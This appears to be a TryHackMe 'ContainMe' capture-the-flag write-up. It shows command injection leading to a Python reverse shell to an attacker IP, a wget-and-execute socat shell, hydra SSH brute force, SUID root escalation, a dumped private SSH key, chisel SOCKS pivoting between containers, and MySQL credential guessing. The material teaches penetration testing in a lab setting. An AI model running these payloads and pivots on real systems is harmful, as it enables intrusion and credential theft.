# ContainMe

## Introduction

Welcome to my another writeup! In this TryHackMe [ContainMe](https://tryhackme.com/room/containme1) room, you'll learn: Command injection, dynamic port forwarding, and more! Without further ado, let's dive in.

## Background

> Where am I ? Catch me

```
Hack into me and look for the hidden flag. Look beyond the horizon.
```

- Overall difficulty for me: Medium
   - Initial foothold: Easy
   - Privilege escalation: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# export RHOSTS=10.10.253.177
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZuuEok1Fj1PzF8NErC0Norql6X1jpgY1lgab4Ic+p22Xim2fsz9G8oxBWQvLHc57LP8oOJkxb4SkJA1bCSvpDXXRXcFZJYyTtDkJuJiLzQYfUSFNlb7uJ3UbtXJmhB+0cioQqmoPNR0PMHkzOt/iKmcXz/zxWpa9KDtwg/DKO7tXbXlwCU75gM9TA/CzpV42X8jLdg3GKDN45ZIUD127SVB+WUTE3NO12RHOWGKEuVrYzhpt/J2FR1othrB4SC4tjB1mOuKOYQB/w20BVDvLCc/U0kwR3bRP9OyuGCcL6KjHTcqhBASBUSMdZERF4kW3oKneFU/ogel3+xDEV9xP
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1L2DsLekoih3uch4TYfg20+y0iLFupq1oBqmPpfaXcwPWVSHBSl6VfN99qidxKzOXWH7bC7qNKCLZQOKUUIZo=
|   256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfYJj6Alf9dI+KYygs+hOfPWUWVebXmTM0zvW4khYy0
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1? syn-ack ttl 63
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           syn-ack ttl 63 OpenSSH 7.7p1 Ubuntu 4ppa1+obfuscated (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:ae:ea:27:3f:ab:10:ae:8c:2e:b3:0c:5b:d5:42:bc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHgrBPgmDTsPn83i4u4uWVdahGI5ANp7amcDEcLIFVp1cdhBFALpbNkt5GcUsZ/Am2OKfNo05BZLg1BhJmp116UbUd6qnOTTRbY7MOTypZdmj52t3tH5UVUASArpaKxbrtCjv8iI+ObyZL4rRZ6oRtRmT2nxDzrFLDj6sZPvgNXZBQp/LUWvHPgTtoRj4mGNIK+5gFQa3xK3N4YIwui1yF5zTGlSq8m1snJGCqH6oOjNhCtGbrVB4nWURht0ghLQKqWre2MxSAlSusnZyJ7P9wjg6g9jbampTtJyyximiY/rZQbIrjsxp8UOyQSyvFrSN4PFyGoZRRzV7iZfDj0TU3
|   256 67:29:75:04:74:1b:83:d3:c8:de:6d:65:fe:e6:07:35 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJoRWFBMbPHOdswibH5Hfnr/PJQCaBrVIWqUpiKJYv0WDk4XIK0IfEE13PpGdh5VMc12K4ghQf6hSv0WlBlAmlg=
|   256 7f:7e:89:c4:e0:a0:da:92:6e:a6:70:45:fc:43:23:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqBJjq2u9t8+rXyrVY3VxrR5VDyoa+1MwEUpvsn6CtG
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 4 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29
2222              | EtherNetIP-1?
8022              | OpenSSH 7.7p1 Ubuntu 4ppa1+obfuscated

### SSH on Port 22

At this moment, **we don't have any credentials**, bruteforcing SSH without knowing the username is NOT efficient.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# ssh anyuser@$RHOSTS
anyuser@10.10.253.177's password: 
Permission denied, please try again.
```

### Unknown Service on Port 2222

**I tried to `nc` into this port, but I got no response:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# nc $RHOSTS 2222
```

### SSH on Port 8022

Again, **we don't have any credentials**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# ssh root@$RHOSTS -p 8022
root@10.10.253.177's password: 
Permission denied, please try again.
```

### HTTP on Port 80

**The home page is a default Apache page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a1.png)

I tried to enumerate hidden directory, but no dice.

**Then, how about hidden file?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php --timeout 30s
[...]
/info.php             (Status: 200) [Size: 68941]
/index.php            (Status: 200) [Size: 329]
```

Ohh! Let's take at look at those PHP pages!

**`/index.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a2.png)

This page shows us the webroot directory (`/var/www/html/`)??

**Also, when I visit the source page:**
```html
<!--  where is the path ?  -->
```

It has a HTML comment that says `where is the path ?`.

And this got me thinking: **What if it needs a GET parameter called `path`??** Let's try this:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a3.png)

Ohh!! We can list all the files in the target machine!

Hmm... Since we can list directory in the target machine, we could try to figure out a user's username, and bruteforce it in SSH??

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a4.png)

- Found user: `mike`

**Bruteforcing SSH on port 22 via `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://$RHOSTS
[...]
[STATUS] 86.00 tries/min, 86 tries in 00:01h, 14344315 to do in 2779:55h, 14 active
[STATUS] 76.00 tries/min, 228 tries in 00:03h, 14344173 to do in 3145:40h, 14 active
```

But no luck. How about SSH on port 8022?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://$RHOSTS -s 8022
[...]
```

Again, not working...

Alright, let's take a step back.

## Initial Foothold

**What if I can read files in the target machine??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a5.png)

Hmm... **Maybe the PHP code is doing the following code?:**

```php
<?php
system('ls -lah '.$_GET['path'])
?>
```

If it's in that case, we have a **command injection** vulnerability!

**we can use a pipe (`|`) to exploit it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a6.png)

Nice!! Let's get a reverse shell!

**To do so, I'll:**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# nc -lnvp 443   
listening on [any] 443 ...
```

- Send a reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.27.249",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/ContainMe/images/a7.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# nc -lnvp 443   
listening on [any] 443 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.253.177] 51704
www-data@host1:/var/www/html$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
host1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:9c:ff:0f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.250.10/24 brd 192.168.250.255 scope global dynamic eth0
       valid_lft 3333sec preferred_lft 3333sec
    inet6 fe80::216:3eff:fe9c:ff0f/64 scope link 
       valid_lft forever preferred_lft forever
7: eth1@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:46:6b:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.20.2/24 brd 172.16.20.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe46:6b29/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`! And we're **inside a container** (`172.16.20.2` usually is a container IP).

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@host1:/var/www/html$ wget http://10.8.27.249/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.8.27.249:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/10/07 09:02:47 socat[61537] N opening character device "/dev/pts/2" for reading and writing
2022/10/07 09:02:47 socat[61537] N listening on AF=2 0.0.0.0:4444
                                                                 2022/10/07 09:03:04 socat[61537] N accepting connection from AF=2 10.10.253.177:42876 on AF=2 10.8.27.249:4444
                                                                    2022/10/07 09:03:04 socat[61537] N starting data transfer loop with FDs [5,5] and [7,7]
                                                root@host1:/root# 
www-data@host1:/var/www/html$ stty rows 22 columns 107
www-data@host1:/var/www/html$ export TERM=xterm-256color
www-data@host1:/var/www/html$ ^C
www-data@host1:/var/www/html$ 
```

## Privilege Escalation

### Containerhost1 www-data to container host1 root

**SUID sticky bit binary:**
```
www-data@host1:/var/www/html$ find / -perm -4000 2>/dev/null
[...]
/usr/share/man/zh_TW/crypt

www-data@host1:/var/www/html$ ls -lah /usr/share/man/zh_TW/crypt
-rwsr-xr-x  1 root root 351K Jul 30  2021 crypt
```

**Found a weird binary that has SUID sticky bit and owned by root:**

Let's analyze this binary!!

```
www-data@host1:/var/www/html$ cd /usr/share/man/zh_TW/

www-data@host1:/usr/share/man/zh_TW$ file crypt
bash: file: command not found

www-data@host1:/usr/share/man/zh_TW$ strings crypt
bash: strings: command not found
```

Ahh... Let's transfer this binary to our attacker machine:

```
www-data@host1:/usr/share/man/zh_TW$ base64 crypt
f0VMRgICAQAAAAAAAAAAAAIAPgABAAAAyGxFAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAD
AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAQHYFAAAAAABAdgUAAAAAAAAQ
[...]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# subl crypt.b64
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# base64 -d crypt.b64 > crypt
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# chmod +x crypt                   
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# file crypt        
crypt: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
```

Now, we can finally analyze this `crypt` binary!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# strings crypt
UPX!
[...]
```

In the `strings` output, we can see that **it's being packed by UPX (Ultimate Packer for eXecutables)**.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# upx -d crypt -o unpacked_crypt
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: crypt: CantUnpackException: bad e_phoff

Unpacked 1 file: 0 ok, 1 error.
```

I tried to fix this issue, but no dice.

Alright, How about we run the binary?

```
www-data@host1:/usr/share/man/zh_TW$ ./crypt
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

Cryptshell?

**After some fumbling, I found that this binary takes an argument to run:**
```
www-data@host1:/usr/share/man/zh_TW$ ./crypt -h
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

You wish!

www-data@host1:/usr/share/man/zh_TW$ ./crypt anything
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Unable to decompress.
```

`Unable to decompress.`?

After enumerate much deeper, I found that **we can supply `mike` as an username to escalate to root!**

```
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/usr/share/man/zh_TW# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
host1
uid=0(root) gid=33(www-data) groups=33(www-data)
[...]
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:9c:ff:0f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.250.10/24 brd 192.168.250.255 scope global dynamic eth0
       valid_lft 2669sec preferred_lft 2669sec
    inet6 fe80::216:3eff:fe9c:ff0f/64 scope link 
       valid_lft forever preferred_lft forever
7: eth1@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:46:6b:29 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.20.2/24 brd 172.16.20.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe46:6b29/64 scope link 
       valid_lft forever preferred_lft forever
```

And I'm root in this container!

### Container host1 root to container host2 mike

In the `netstat` output, I saw **there is a SSH port opened, but not inside the container.**

```
root@host1:/usr/share/man/zh_TW# netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      140/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      212/sshd            
tcp6       0      0 :::22                   :::*                    LISTEN      212/sshd            
tcp6       0      0 :::80                   :::*                    LISTEN      262/apache2         
udp        0      0 127.0.0.53:53           0.0.0.0:*                           140/systemd-resolve 
udp        0      0 192.168.250.10:68       0.0.0.0:*                           138/systemd-network
```

Also, I found that user `mike` has a private SSH key!

```
root@host1:/usr/share/man/zh_TW# ls -lah /home/mike/.ssh
[...]
-rw------- 1 mike mike 1.7K Jul 15  2021 id_rsa
-rw-r--r-- 1 mike mike  392 Jul 15  2021 id_rsa.pub

root@host1:/usr/share/man/zh_TW# cat /home/mike/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
djcIozYXVYdmj9v3e8xPbR6ybJX6fKpTuaDVdiwqQAecbvs5tBUkonAYUBuv1nhb
[...]
```

Maybe we can SSH into mike directly to the target machine?

**Let's copy and paste it to our attacker machine:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# nano mike_id_rsa
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# chmod 600 mike_id_rsa
```

I tried to use the private key to directly connect to SSH port to the target machine, but no dice.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# ssh -i mike_id_rsa mike@$RHOSTS                        
mike@10.10.253.177's password: 
                                                                             
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# ssh -i mike_id_rsa mike@$RHOSTS -p 8022
mike@10.10.253.177's password: 

```

Hmm... Let's do a **dynamic port forwarding via `chisel`**!

- Transfer the `chisel` binary to the target machine:

```
┌──(root🌸siunam)-[/opt/chisel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

root@host1:/usr/share/man/zh_TW# wget http://10.8.27.249/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel;cd /tmp
```

- Establish dynamic port forwarding:

```
┌──(root🌸siunam)-[/opt/chisel]
└─# ./chiselx64 server -p 8888 --reverse

root@host1:/tmp# ./chisel client 10.8.27.249:8888 R:socks
2022/10/07 08:13:15 client: Connecting to ws://10.8.27.249:8888
2022/10/07 08:13:16 client: Connected (Latency 240.613249ms)
```

Now, since we don't know how many containers are running, I'll run a very, very lite port scanning to the entire container subnet via `nmap` with `proxychains`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# proxychains nmap --top-port=5 172.16.20.0/24
[...]
Nmap scan report for 172.16.20.0
Host is up (0.00016s latency).

PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  filtered ssh
23/tcp  filtered telnet
80/tcp  filtered http
443/tcp filtered https

Nmap scan report for 172.16.20.1
Host is up (0.0017s latency).

PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  filtered ssh
23/tcp  filtered telnet
80/tcp  filtered http
443/tcp filtered https
[...]
```

However, all of them are being filtered...

**Then I guess I'll have to write a simple python script to bruteforce the SSH port:**
```py
#!/usr/bin/env python3

import os

for host in range(1,254):
	os.system(f'proxychains ssh -i mike_id_rsa -o PasswordAuthentication=no mike@172.16.20.{host}')
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/ContainMe]
└─# python3 ssh_port_enum.py                                                    
[...]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.5:22 <--socket error or timeout!
ssh: connect to host 172.16.20.5 port 22: Connection refused
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.6:22  ...  OK
[...]
mike@host2:~$ whoami;hostname;id;ip a
mike
host2
uid=1001(mike) gid=1001(mike) groups=1001(mike)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
9: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:17:60:9e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.20.6/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe17:609e/64 scope link 172.16.20.6
       valid_lft forever preferred_lft forever
```

Found it! `172.16.20.6` has SSH opened and we sucessfully logged in to mike with the private key!

### Container host2 mike to root

**In the `netstat` output, we can see that the MySQL (Port 3306) is opened internally:** 
```
mike@host2:~$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```

> Note: Currently this room's host2 doesn't start the MySQL service properly.

**Now, we can guess the MySQL credentials!**
```
mike@host2:~$ mysql -umike -ppassword
[...]
mysql> 
```

I'm in!

Next, we can enumerate all the databases:

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+

mysql> use accounts;
```

Found database: `accounts`

```
mysql> show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
```

Found table name in database `accounts`: `users`

Let's extract it's data!

```
mysql> SELECT * FROM users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | {Redacted}          |
| mike  | {Redacted}          |  
+-------+---------------------+
```

Found `root` password! Let's **Switch User** to `root`!

```
mike@host2:~$ su root
Password: 

root@host2:/home/mike# whoami;hostname;id;ip a
root
host2
uid=0(root) gid=0(root) groups=0(root)
[...]
9: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:17:60:9e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.20.6/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe17:609e/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root in `host2`! :D

## Rooted

**In the home directory of user `root`, there is a zip file called `mike.zip`:**
```
root@host2:/home/mike# ls -lah /root
[...]
-rw-------  1 root root  218 Jul 16  2021 mike.zip
```

**However, when we try to `unzip` it, it needs a password:**
```
root@host2:/home/mike# unzip /root/mike.zip 
Archive:  /root/mike.zip
[/root/mike.zip] mike password:
```

**Fortunately, we found `mike`'s password in the MySQL `accounts` database! Let's use that password to `unzip` that!**
```
root@host2:/home/mike# unzip /root/mike.zip 
Archive:  /root/mike.zip
[/root/mike.zip] mike password: 
 extracting: mike
```

**flag:**
```
root@host2:/home/mike# cat mike 
THM{Redacted}
```

# Conclusion

What we've learned:

1. Hidden File Enumeration
2. Command Injection
3. Privilege Escalation via SUID Sticky Bit Binary
4. Dynamic Port Forwarding via `chisel`
5. MySQL Enumeration